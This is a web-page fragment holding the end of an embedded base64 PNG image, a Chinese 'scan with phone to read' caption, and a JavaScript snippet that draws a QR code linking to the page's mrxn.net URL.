3Q3sBgLz0wHhjx6xnowxeh38Wb9VH0g/uGH3eh64eYDNZr7jZvhamAem95yv9KcGycENzT+Cu4E8UnR5/t0N/PVAIE+CR4T7XF9Hnz7RPMz9el5f4b3cmNcHc2+YefdB8l2X1x4VcrG0CnmtKzov7a8HUk2u+L4b+LaBQJ4ejwbhPgUwc30iJL/i6h3tX7jKqUP2gKC6WD0qYM6XNoZ+EWb/mW5eHHt/20BsfuHf3cBuIOO0xvVqGz3m5SLMTw/c56s+6mLvD+kLaFmitSIw/QmpF0Ly6hBuvWj+DCH1R77dQI5Ml/ZzN7ANBDI1uI+ro/mUQOr1qZ/x7tPfEdIfgmPeHqI5mL0QDkH94lmdeRHmPuodIT51CIcbbgPRdOFrb+AayGvvf7f7/wAAAP//WJiffgAAAAZJREFUAwAoBmi/IZPfvwAAAABJRU5ErkJggg==)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/dongsheng-SoftMng-FileInputHandler-Delete.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 